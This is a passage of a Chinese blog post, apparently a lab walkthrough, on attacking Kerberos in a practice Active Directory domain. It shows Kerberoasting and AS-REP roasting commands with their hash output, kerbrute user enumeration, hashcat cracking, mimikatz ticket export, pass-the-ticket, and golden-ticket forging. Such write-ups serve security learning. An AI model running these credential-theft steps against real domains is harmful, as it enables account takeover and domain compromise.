class="string">                             B82C4EEA0F199640460E8B00F8E1E8115DF7F0911295008FF0E1C53C72AD1FA9E27EA71622D6D19B</span></span><br><span class="line"><span class="string">						   ......</span></span><br><span class="line"><span class="string">                             00097158E360177967C7E017FFF668FD344B2F42E4D7B8BD5E190F688CA83F5AFA8E29F47B5ED488</span></span><br><span class="line"><span class="string">                             9A3995140D3FEAC5ABD25C244ABE894E3D3386AE84435FACDB8C15FC56C3</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/thm/dc]</span><br><span class="line">└─<span class="comment"># impacket-GetUserSPNs controller.local/Machine1:Password1 -dc-ip 10.10.79.10 -request                   </span></span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation </span><br><span class="line">-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------</span><br><span class="line">CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=<span class="built_in">local</span>  2020-05-26 06:28:26.922527  2020-05-26 06:46:42.467441             </span><br><span class="line">CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-26 06:39:17.578393  2020-05-26 06:40:14.671872             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*SQLService<span class="variable">$CONTROLLER</span>.LOCAL<span class="variable">$controller</span>.<span class="built_in">local</span>/SQLService*$284b86804969fcad912913c995a87122<span class="variable">$9f23877d25bc8cddabd687c3aa89d878bb926db8b684ff937a4fa1a25c94989a0a1e039b8a21b29b88759ef09f43fd0edd4e2cdf688019f080945bba722138b</span>......</span><br><span class="line">d40cb5c2c9267594874f7e393763e81141370fd422624b340070cfe7e5f20bd6a9b5be125b7550055241219e6daa7fc504fa1c</span><br><span class="line">$krb5tgs$23$*HTTPService<span class="variable">$CONTROLLER</span>.LOCAL<span class="variable">$controller</span>.<span class="built_in">local</span>/HTTPService*$3760a3668088f7092337c2e826c43790<span class="variable">$75fe3fb9176fcbf3c62a8ae0630b628a7fb6b954e4dc87770128407ca83125f1836abde59017299e01ae3471c80358a5facb984ffc606f06c147202283ea30fa1f04442d9755934a87d428c760f9a3a0f228536454e9ba8f090e3107365d225603bd71b5c2f5d78efe29d5a0fe89d79bd1992b7ad6898e7a</span>......</span><br><span class="line">19b97dde84b97a95a79460bd7c41ec97791759524c91d47df3ab4350d06582a0160d9730d8bd84785eab1f51c8bff55430435548</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="破解hash"><a href="#破解hash" class="headerlink" title="破解hash"></a>破解hash</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m <span class="number">13100</span> kerberoas_hash2 <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt </span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="服务帐户可以做什么？"><a href="#服务帐户可以做什么？" class="headerlink" title="服务帐户可以做什么？"></a>服务帐户可以做什么？</h4><p>破解服务帐户密码后，根据服务帐户是否为域管理员，有多种方法可以窃取数据或收集战利品。如果服务帐户是域管理员，您拥有类似于金/银票的控制权，并且现在可以收集战利品，例如转储 NTDS.dit。如果服务帐户不是域管理员，您可以使用它来登录其他系统并进行旋转或升级，或者您可以使用破解的密码来攻击其他服务和域管理员帐户；许多公司可能会为其服务或域管理员用户重复使用相同或相似的密码。</p>
+<h2 id="5-用Rubeus进行AS-REP-Roasting"><a href="#5-用Rubeus进行AS-REP-Roasting" class="headerlink" title="#5 用Rubeus进行AS-REP Roasting"></a>#5 用Rubeus进行AS-REP Roasting</h2><h4 id="Rubeus-1"><a href="#Rubeus-1" class="headerlink" title="Rubeus"></a>Rubeus</h4><p><code>Rubeus.exe asreproast</code> - 这将运行 AS-REP Roasting 命令寻找易受攻击的用户，然后转储发现的易受攻击的用户哈希。</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Rubeus</span><span class="selector-class">.exe</span> <span class="selector-tag">asreproast</span></span><br><span class="line"><span class="selector-tag">controller</span>\<span class="selector-tag">administrator</span>@<span class="selector-tag">CONTROLLER-1</span> <span class="selector-tag">C</span>:\<span class="selector-tag">Users</span>\<span class="selector-tag">Administrator</span>\<span class="selector-tag">Downloads</span>&gt;<span class="selector-tag">Rubeus</span><span class="selector-class">.exe</span> <span class="selector-tag">asreproast</span></span><br><span class="line"></span><br><span class="line">   <span class="selector-tag">______</span>        <span class="selector-tag">_</span></span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )<span class="selector-tag">_</span>   <span class="selector-tag">_</span>| |<span class="selector-tag">__</span>  <span class="selector-tag">_____</span> <span class="selector-tag">_</span>   <span class="selector-tag">_</span>  <span class="selector-tag">___</span></span><br><span class="line">  |  <span class="selector-tag">__</span>  /| | | |  <span class="selector-tag">_</span> \| <span class="selector-tag">___</span> | | | |/<span class="selector-tag">___</span>)</span><br><span class="line">  | |  \ \| |<span class="selector-tag">_</span>| | |<span class="selector-tag">_</span>) ) <span class="selector-tag">____</span>| |<span class="selector-tag">_</span>| |<span class="selector-tag">___</span> |</span><br><span class="line">  |<span class="selector-tag">_</span>|   |<span class="selector-tag">_</span>|<span class="selector-tag">____</span>/|<span class="selector-tag">____</span>/|<span class="selector-tag">_____</span>)<span class="selector-tag">____</span>/(___/</span><br><span class="line"></span><br><span class="line">  v1.<span class="number">5.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] <span class="attribute">Action</span>: AS-REP roasting</span><br><span class="line"></span><br><span class="line">[*] Target <span class="attribute">Domain          </span>: CONTROLLER.local</span><br><span class="line"></span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local&#x27;</span> for AS-REP roastable users</span><br><span class="line">[*] <span class="attribute">SamAccountName         </span>: Admin2</span><br><span class="line">[*] <span class="attribute">DistinguishedName      </span>: CN=Admin-<span class="number">2</span>,CN=Users,DC=CONTROLLER,DC=local</span><br><span class="line">[*] Using domain <span class="attribute">controller</span>: CONTROLLER-<span class="number">1</span>.CONTROLLER.local (<span class="attribute">fe80</span>::<span class="number">1017</span>:<span class="attribute">ba9c</span>:<span class="attribute">ee45</span>:<span class="number">508</span>d%<span class="number">5</span>)</span><br><span class="line">[*] Building AS-REQ (w/o preauth) <span class="attribute">for</span>: <span class="string">&#x27;CONTROLLER.local\Admin2&#x27;</span></span><br><span class="line">[+] AS-REQ w/o preauth successful!</span><br><span class="line">[*] AS-REP <span class="attribute">hash</span>:</span><br><span class="line"></span><br><span class="line">      $krb5asrep$Admin2<span class="variable">@CONTROLLER</span>.<span class="attribute">local</span>:<span class="number">06</span>CDBC190707473F71CDF6CECAE5F20B$<span class="number">0</span>AD65C0ACC46</span><br><span class="line">      ED5215457CF68B1BB3FA8F6322E750A61AFB1977D1C1AB50138FA51B9907E1FB47B32241D636A8C8</span><br><span class="line">      EEF5564ED8A0F1756582CAD702F5DD776317BC1B99814AA31C9527A8AB15D47FAB6DF19F5428382A</span><br><span class="line">      A70B036C1B54BF482BB317AFD03F26C73F7214FFC3F5398250C7F928A391FCBF3EB445A4BD34409D</span><br><span class="line">      CE1241BF34BE9EC3787815978E6A52A6FBAA92061FB90434D5F6F40F75649C7F5457A48BBF146C74</span><br><span class="line">      EF2CFDC4540BD3A313BDE30E2030D10A0CE707304461C80CBEEB4EE8B7FF4B3869E1ECBEEB4B84C3</span><br><span class="line">      <span class="number">93</span>A7683056C1D880E5882B2AB56E784C97F620F0B9870105398CF8824BF25E8CC4ED5EB282D9</span><br><span class="line"></span><br><span class="line">[*] <span class="attribute">SamAccountName         </span>: User3</span><br><span class="line">[*] <span class="attribute">DistinguishedName      </span>: CN=User-<span class="number">3</span>,CN=Users,DC=CONTROLLER,DC=local</span><br><span class="line">[*] Using domain <span class="attribute">controller</span>: CONTROLLER-<span class="number">1</span>.CONTROLLER.local (<span class="attribute">fe80</span>::<span class="number">1017</span>:<span class="attribute">ba9c</span>:<span class="attribute">ee45</span>:<span class="number">508</span>d%<span class="number">5</span>)</span><br><span class="line">[*] Building AS-REQ (w/o preauth) <span class="attribute">for</span>: <span class="string">&#x27;CONTROLLER.local\User3&#x27;</span></span><br><span class="line">[+] AS-REQ w/o preauth successful!</span><br><span class="line">[*] AS-REP <span class="attribute">hash</span>:</span><br><span class="line"></span><br><span class="line">      $krb5asrep$User3<span class="variable">@CONTROLLER</span>.<span class="attribute">local</span>:A2342209F120FA68D66E88C3FA1DC661$<span class="number">8225304</span>A422C8</span><br><span class="line">      <span class="number">7024</span>ACC1EBC674E2CA5A29F4DC512CD4824466F337CB9190098A881785B20C3249F2FFA45A3900E6</span><br><span class="line">      <span class="number">87150</span>A8186E9403271237B19F240A191AA176B6C832DAFC2FC04E3FA5BFCAEB44E6F850DA5FC3889</span><br><span class="line">      <span class="number">6</span>C7419101D679C382A6DE6054701BDC05AB48CE179D787D62AC23A5B13C59C897B5FF0EDC588FA67</span><br><span class="line">      <span class="number">2044</span>ABB10A91F1D537AE4D492D906FC26E9C91D4E07FE9209BB798D4B1A119611D187EFA7F4B3C51</span><br><span class="line">      BBD9EADEE8125DD703CDFB2B2BC6B9AA6F0626F2F6112A556244F8363F1ECAD69F92A464E4EAFD75</span><br><span class="line">      <span class="number">48</span>AFC9EC0F1D42331F93F4AB3FD60F4592B2AEAD5B647F3D66CCD5EF44A18A26EA72C95F6C3</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="impacket-GetNPUsers"><a href="#impacket-GetNPUsers" class="headerlink" title="impacket-GetNPUsers"></a>impacket-GetNPUsers</h4><ol>
+<li>先用kerbrute枚举用户名。</li>
+<li>再用impacket-GetNPUsers对已存在用户进行AS-REP Roasting </li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/thm/dc]</span><br><span class="line">└─<span class="comment"># ./kerbrute_linux_amd64 userenum -d controller.local --dc 10.10.79.10 User.txt</span></span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: v1.0.3 (9dad6e1) - 05/31/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/05/31 14:42:12 &gt;  Using KDC(s):</span><br><span class="line">2022/05/31 14:42:12 &gt;  	10.10.79.10:88</span><br><span class="line"></span><br><span class="line">2022/05/31 14:42:12 &gt;  [+] VALID USERNAME:	 admin1@controller.local</span><br><span class="line">2022/05/31 14:42:12 &gt;  [+] VALID USERNAME:	 administrator@controller.local</span><br><span class="line">2022/05/31 14:42:12 &gt;  [+] VALID USERNAME:	 admin2@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  [+] VALID USERNAME:	 httpservice@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  [+] VALID USERNAME:	 user1@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  [+] VALID USERNAME:	 sqlservice@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  [+] VALID USERNAME:	 machine1@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  [+] VALID USERNAME:	 machine2@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  [+] VALID USERNAME:	 user3@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  [+] VALID USERNAME:	 user2@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  Done! Tested 100 usernames (10 valid) <span class="keyword">in</span> 2.335 seconds</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[~/thm/dc]</span><br><span class="line">└─<span class="comment"># impacket-GetNPUsers controller.local/ -dc-ip 10.10.79.10 -usersfile users.txt</span></span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User admin1 doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User administrator doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">$krb5asrep$23<span class="variable">$admin2</span>@CONTROLLER.LOCAL:07a875b10ff834c5a2aea53d367d88e0<span class="variable">$d867b1bb964665668d8405a90ccf69099c615ffd2611be6c53ffde1fa918b55a5bd4f8078d20124cc2b88e14939e76f7cb20f36e1dc26282b03b5455ba979ca8b5a8680b585bee525a28746ef61bf096706addfdd47fcbd434d55581a2492522cd6884b48e6c1342abd67a62f0f1d8121ba9a559a4827550603699a7d408e2ff74521208f153bbd77b80d54dd71909e650f6898180f38eac5ed0013bd1c86baa70c5acb0567873d10a7270cb03b65c4fb03f12dddf76e3db5f1cc330d126017725b9571c02e87c1b30b6457ab390d47e73ed1838ec0a34345de43fd9a604f0d4cf2930b50d2717cbd54d13040c6e35c6828190d8</span></span><br><span class="line">[-] User httpservice doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User user1 doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User sqlservice doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User machine1 doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User machine2 doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">$krb5asrep$23$user3@CONTROLLER.LOCAL:e6bed73be459842186ce695e7080075b$0d9f7c02066d7255f0ffae252d29b4738af12e3f914559fc67e3b4b6fa52afdc5904c5b769c58afed62caa2e714b64748194a50e6b38ae47f2d3f03faf6bd50570d0d382885cc59a98fd4b3844fb557b37c98855e7b3d0423faa4683341bc06eba64f0e5df2fc2b506987225b885ccf06ca94801273b355f1af2c001b151f73a2d8eae8470d7699d20c12b8f7e9b0410de278189f3bfb905a3626c3be77f803f69e5885f7e91a0564f4f5c7a15789bb32b7aec1df7705ba84cf4066df79d007be9c91da6b0fc001553a68b0f2f4a7f01e22211ea171ee80a44469f661fdda4422e6fe99b6a72316395c874c316b1c731c05f6c63</span></span><br><span class="line"><span class="string">[-] User user2 doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="Hashcat-破解hash"><a href="#Hashcat-破解hash" class="headerlink" title="Hashcat 破解hash"></a>Hashcat 破解hash</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m <span class="number">18200</span> hash.txt <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt </span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="6使用-mimikatz-传递票据"><a href="#6使用-mimikatz-传递票据" class="headerlink" title="#6使用 mimikatz 传递票据"></a>#6使用 mimikatz 传递票据</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Downloads&gt;mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::<span class="builtin-name">debug</span> </span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK </span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::tickets /<span class="builtin-name">export</span> </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>导出kirbi文件在mimikatz同级目录下</p>
+<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/3154a0edb7581424e8ab64130f8c288b.png" alt="image-20220531163144243"></p>
+<p>导入票据</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos<span class="number">::</span>ptt &lt;ticket&gt;</span><br><span class="line">kerberos<span class="number">::</span>ptt [<span class="number">0;48506</span>]-<span class="number">2</span>-<span class="number">0-40e10000</span>-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/779d67e721c744fb9731b6a5ef0e188c.png" alt="image-20220531164744121"></p>
+<h2 id="7-mimikatz-金-银票攻击"><a href="#7-mimikatz-金-银票攻击" class="headerlink" title="#7 mimikatz 金/银票攻击"></a>#7 mimikatz 金/银票攻击</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span>.exe</span><br><span class="line"><span class="attribute">privilege</span>::debug</span><br><span class="line"><span class="attribute">Kerberos</span>::golden /user:Administrator /domain:controller.local /sid:S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">432953485</span>-<span class="number">3795405108</span>-<span class="number">1502158860</span> /krbtgt:<span class="number">72</span>cd<span class="number">714611</span>b<span class="number">64</span>cd<span class="number">4</span>d<span class="number">5550</span>cd<span class="number">2759</span>db<span class="number">3</span>f<span class="number">6</span> /id:<span class="number">502</span></span><br></pre></td></tr></table></figure>
+
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
